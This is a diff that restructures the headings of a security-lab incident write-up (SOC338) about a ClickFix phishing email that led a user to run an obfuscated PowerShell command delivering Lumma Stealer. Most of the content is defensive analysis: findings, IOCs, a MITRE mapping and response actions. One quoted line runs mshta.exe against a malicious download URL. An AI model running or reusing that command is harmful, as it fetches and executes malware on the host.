@@ -1,12 +1,9 @@
-#  SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing
+# Lumma Stealer - DLL Side-Loading via Click Fix Phishing
 
-##  Summary
+## 1. Alert Summary
 
-A phishing email offering a free Windows 11 Pro upgrade was delivered to an internal user. The user clicked the embedded link and was redirected to a ClickFix phishing page that executed an obfuscated PowerShell command. The command launched **mshta.exe** and attempted to retrieve remote content from a suspicious domain associated with Lumma Stealer distribution.
+### Alert Details
 
----
-
-##  Alert Details
 
 | Field | Value |
 |---------|---------|
@@ -21,7 +18,23 @@ A phishing email offering a free Windows 11 Pro upgrade was delivered to an inte
 
 ---
 
-##  Investigation
+
+
+## 2. Investigation Overview
+
+### Summary
+
+
+A phishing email offering a free Windows 11 Pro upgrade was delivered to an internal user. The user clicked the embedded link and was redirected to a ClickFix phishing page that executed an obfuscated PowerShell command. The command launched **mshta.exe** and attempted to retrieve remote content from a suspicious domain associated with Lumma Stealer distribution.
+
+---
+
+
+
+## 3. Evidence Analysis
+
+### Investigation
+
 
 ### Key Findings
 
@@ -47,7 +60,9 @@ mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
 
 ---
 
-##  Indicators of Compromise (IOCs)
+
+### Indicators of Compromise (IOCs)
+
 
 | Type | Indicator |
 |---------|---------|
@@ -59,7 +74,14 @@ mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
 
 ---
 
-##  MITRE ATT&CK Mapping
+### External References
+
+Public sources used for contextual cross-checking. Their findings are not attributed to this lab investigation unless independently corroborated.
+
+- [Independent SOC338 walkthrough](https://securebydefault.io/blog/soc338-lumma-stealer-dll-side-loading-clickfix-phishing/)
+
+## 4. MITRE ATT&CK Mapping
+
 
 | Technique | Description |
 |------------|------------|
@@ -71,7 +93,10 @@ mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
 
 ---
 
-##  Response Actions
+
+
+## 5. Response Actions
+
 
 - Confirmed phishing email delivery
 - Validated user interaction with malicious URL
@@ -83,15 +108,22 @@ mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4
 
 ---
 
-##  Conclusion
+
+
+## 6. Conclusion
+
 
 The investigation confirmed a phishing campaign leveraging a ClickFix social engineering technique. The victim accessed a malicious webpage and executed an obfuscated PowerShell command that launched **mshta.exe** and connected to an external suspicious domain associated with Lumma Stealer distribution.
 
-##  Final Verdict
+
+### Final Verdict
+
 
 **True Positive**
 
-##  Classification
+
+### Classification
+
 
 **Phishing / ClickFix / Lumma Stealer Delivery**
 
